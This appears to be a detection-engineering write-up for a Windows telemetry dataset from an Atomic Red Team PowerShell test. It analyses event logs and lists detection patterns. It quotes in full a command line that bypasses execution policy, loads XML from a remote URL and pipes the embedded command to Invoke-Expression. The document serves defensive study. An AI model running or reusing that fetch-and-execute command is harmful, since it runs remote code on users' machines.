# T1059.001-7: PowerShell — Powershell XML requests

## Technique Context

T1059.001 PowerShell execution is a fundamental technique where adversaries leverage Microsoft's PowerShell to execute commands, scripts, and download or execute malicious payloads. This specific test demonstrates a common pattern where PowerShell loads XML content from a remote URL and executes embedded commands through `Invoke-Expression` (IEX). This technique is particularly concerning because it combines remote content retrieval with code execution, allowing attackers to host payloads externally and execute them dynamically. Detection teams typically focus on monitoring PowerShell command lines for suspicious patterns like `System.Xml.XmlDocument`, `.Load()` methods with URLs, and the use of `IEX` or similar execution cmdlets.

## What This Dataset Contains

The dataset captures a PowerShell execution chain that loads XML from a remote GitHub repository and executes embedded commands. The key evidence appears in Security event 4688 showing the cmd.exe process creation with the full command line: `"cmd.exe" /c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"`. 

The process chain shows: PowerShell (PID 23216) → cmd.exe (PID 23436) → PowerShell with XML loading command. Sysmon captures the process creation events (EID 1) for both cmd.exe and whoami.exe, along with process access events (EID 10) showing PowerShell accessing both child processes. The cmd.exe process exits with status 0xFF, indicating an error occurred during execution.

Sysmon also captures extensive image loading events (EID 7) showing PowerShell loading .NET runtime components, Windows Defender DLLs, and urlmon.dll - the latter being particularly relevant for URL-based content retrieval.

## What This Dataset Does Not Contain

The dataset lacks the actual PowerShell script block logging (EID 4104) that would contain the XML loading and execution commands - most PowerShell events are just Set-StrictMode boilerplate. There are no network connection events (Sysmon EID 3) that would show the HTTPS request to GitHub, likely because the sysmon-modular configuration may not capture all network activity or the connection was brief. The dataset doesn't show what command was actually embedded in the XML file or executed via IEX, as the technique appears to have failed (cmd.exe exit status 0xFF). DNS query events (Sysmon EID 22) for the GitHub domain resolution are also absent.

## Assessment

This dataset provides moderate detection value for PowerShell XML-based execution techniques. The Security audit logs with command-line logging offer the strongest detection opportunity, clearly showing the suspicious PowerShell command pattern. The Sysmon process creation and image loading events provide good process chain visibility and artifact loading context. However, the missing script block logging significantly reduces the dataset's value for understanding PowerShell execution details, and the lack of network telemetry limits visibility into the remote content retrieval aspect. The technique appears to have failed in execution, which means some successful execution artifacts may be missing.

## Detection Opportunities Present in This Data

1. **Command-line pattern matching** on Security EID 4688 for PowerShell commands containing `System.Xml.XmlDocument`, `.Load()` with URLs, and `IEX` execution patterns
2. **Process chain analysis** detecting PowerShell spawning cmd.exe which then spawns PowerShell with suspicious parameters like `-exec bypass -noprofile`
3. **Image loading sequence detection** for PowerShell processes loading urlmon.dll, indicating URL-based content retrieval capabilities
4. **Execution policy bypass detection** through PowerShell module logging EID 4103 showing `Set-ExecutionPolicy` with `Bypass` parameter
5. **Process access pattern analysis** using Sysmon EID 10 to detect PowerShell processes accessing child processes with high privileges (0x1FFFFF)
6. **Remote URL pattern matching** in command lines for known malicious or suspicious domains/repositories, particularly raw content URLs from code repositories
7. **PowerShell parameter analysis** for combinations of `-exec bypass`, `-noprofile`, and inline script execution patterns
